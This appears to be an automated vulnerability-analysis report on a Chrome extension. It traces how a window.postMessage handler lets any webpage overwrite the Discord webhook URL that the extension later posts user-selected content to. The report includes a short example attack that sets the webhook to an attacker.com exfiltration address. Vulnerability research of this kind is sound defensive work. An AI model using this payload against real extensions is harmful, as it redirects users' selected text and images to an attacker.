# CoCo Analysis: lejjklodflojhdolpdailomgifgbacog

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2

---

## Sink 1: cs_window_eventListener_message → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/lejjklodflojhdolpdailomgifgbacog/opgen_generated_files/cs_0.js
Line 468: `window.addEventListener('message', function(event) {`
Line 471: `if (event.source === window && event.data && event.data.action === 'setWebhookUrl') {`
Line 473: `const webhookUrl = event.data.url;`

**Code:**

```javascript
// Content script (cs_0.js) - Lines 468-487
window.addEventListener('message', function(event) {
    // Check if the message is from the extension and has the expected action
    if (event.source === window && event.data && event.data.action === 'setWebhookUrl') {
        const webhookUrl = event.data.url; // ← attacker-controlled webhook URL

        console.log('Received Webhook URL:', webhookUrl);

        // Send the webhook URL to background.js
        chrome.runtime.sendMessage({ action: 'setWebhookUrl', url: webhookUrl }, function(response) {
            if (response && response.success) {
                console.log('Webhook URL sent to background.js successfully:', webhookUrl);
            }
        });
    }
});

// Background script (bg.js) - Lines 978-994
chrome.runtime.onMessage.addListener(function(message, sender, sendResponse) {
    if (message.action === 'setWebhookUrl') {
        const newWebhookUrl = message.url; // ← attacker-controlled URL
        updateWebhookUrl(newWebhookUrl);
        sendResponse({ success: true });
    }
});

function updateWebhookUrl(newWebhookUrl) {
    webhookUrl = newWebhookUrl;
    chrome.storage.local.set({ 'lastUsedWebhook': webhookUrl }); // ← stored
}

// Background script - Lines 1008-1021, 1040-1046
function sendTextToDiscord(text) {
    chrome.storage.local.get('lastUsedWebhook', function(result) {
        const storedWebhookUrl = result.lastUsedWebhook; // ← retrieved
        if (!storedWebhookUrl) {
            console.error('Webhook URL is not set.');
            return;
        }
        sendRequest(storedWebhookUrl, { content: text }); // ← used in fetch
    });
}

function sendRequest(url, payload) {
    fetch(url, { // ← attacker-controlled URL used in fetch()
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    })
    .then(response => {
        if (!response.ok) {
            console.error('Failed to send request to Discord:', response.status, response.statusText);
        }
    });
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage from malicious webpage

**Attack:**

```javascript
// Attacker's malicious webpage code
window.postMessage({
    action: 'setWebhookUrl',
    url: 'https://attacker.com/exfiltrate'
}, '*');

// Now when user right-clicks and selects "Send to Discord",
// the extension will POST selected text/images to attacker's server
```

**Impact:** Complete SSRF and data exfiltration vulnerability. An attacker can poison the stored webhook URL, which is then retrieved and used in privileged fetch() requests. When users use the context menu to "send text/image to Discord", the extension instead sends that data to the attacker's server. This achieves both arbitrary cross-origin requests with extension privileges and exfiltration of user-selected content.

---

## Sink 2: cs_window_eventListener_message → fetch_resource_sink

**CoCo Trace:**
Same as Sink 1 (Lines 468, 471, 473)

**Classification:** TRUE POSITIVE

**Reason:** This is the same vulnerability as Sink 1, just detected as a direct flow to fetch_resource_sink rather than through storage. The complete exploitation chain is: attacker postMessage → content script → background message → storage.set → storage.get → fetch(attacker-controlled-url). Both sinks represent the same TRUE POSITIVE vulnerability with complete storage exploitation chain.
